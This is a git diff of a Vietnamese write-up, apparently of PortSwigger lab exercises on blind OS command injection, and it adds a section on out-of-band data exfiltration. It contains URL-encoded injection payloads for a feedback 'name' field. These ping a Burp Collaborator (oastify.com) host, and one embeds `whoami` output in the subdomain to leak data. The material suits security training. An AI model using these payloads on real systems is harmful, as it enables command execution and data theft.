@@ -26,11 +26,21 @@ Truy cập URL `/images?filename=hello.txt`, ta có được nội dung của l�
 
 # 4. Blind OS command injection with out-of-band interaction
 Trong chức năng feedback, ta thay đổi tham số username:
-`name=test%22%3B%70%69%6E%67%20%6D%71%67%35%63%79%6A%68%72%6D%70%74%34%36%71%6D%76%61%6E%69%63%73%31%6C%35%63%62%32%7A%72%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22`, tương ứng `name=test";ping mqg5cyjhrmpt46qmvanics1l5cb2zr.oastify.com;echo "` sau khi URL decode.
+`name=test%22%3B%70%69%6E%67%20%77%77%77%79%6F%74%37%79%63%66%61%6E%6C%73%61%35%6D%6A%76%6D%68%34%79%65%76%35%31%76%70%6B%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22`, tương ứng `name=test";ping wwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com;echo "` sau khi URL decode.
 
-![Uploading image.png…]()
+![image](https://user-images.githubusercontent.com/103978452/202840899-8f8acbec-5225-4971-b130-a593ee2e07ff.png)
 
 Sau khi gửi request, kiểm tra trong BurpCollaborator client thì thấy có request được gửi đến
 
-![Uploading image.png…]()
+![image](https://user-images.githubusercontent.com/103978452/202840925-0bf184d6-cffd-4895-a8c7-f6f3bac49a44.png)
 
+# 5. Blind OS command injection with out-of-band data exfiltration
+Thử sử dụng payload như trong challenge #4, ta thấy kết quả vẫn thành công.
+
+Ta sẽ lấy dữ liệu bằng cách thay đổi subdomain trong URL của Burp Collaborator Server. Trong phần body của request POST /feedback/submit, ta thay đổi tham số name thành `name=%22%3B%70%69%6E%67%20%60%77%68%6F%61%6D%69%60%77%77%77%79%6F%74%37%79%63%66%61%6E%6C%73%61%35%6D%6A%76%6D%68%34%79%65%76%35%31%76%70%6B%2E%6F%61%73%74%69%66%79%2E%63%6F%6D%3B%65%63%68%6F%20%22` (tương ứng `name=";ping `whoami`wwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com;echo "` sau khi URL decode)
+
+Sau khi nhấn send, vào Burp Collaborator Client kiểm tra thì thấy có một request với URL "peter-msIKBjwwwyot7ycfanlsa5mjvmh4yev51vpk.oastify.com", phần "peter-msIKBj" chính là kết quả của lệnh whoami.
+
+![image](https://user-images.githubusercontent.com/103978452/202841656-f63309f1-cec9-41da-95cc-af6378c6e77b.png)
+
+Sử dụng thông tin đã có để submit solution, kết quả thành công.
